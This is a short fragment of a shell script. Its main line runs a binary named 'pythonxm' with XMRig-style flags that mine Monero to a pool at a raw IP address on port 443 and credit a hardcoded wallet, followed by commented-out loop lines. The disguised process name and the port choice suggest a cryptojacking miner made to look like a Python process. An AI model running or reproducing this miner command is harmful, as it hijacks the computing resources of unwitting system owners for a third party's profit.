...
pythonxm  -o 116.203.206.127:443 --coin=XMR -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k --cpu-no-yield --randomx-1gb-pages --randomx-wrmsr=-1
#while [ 1 ]
#do
#    echo '#######################################################################################################################################'
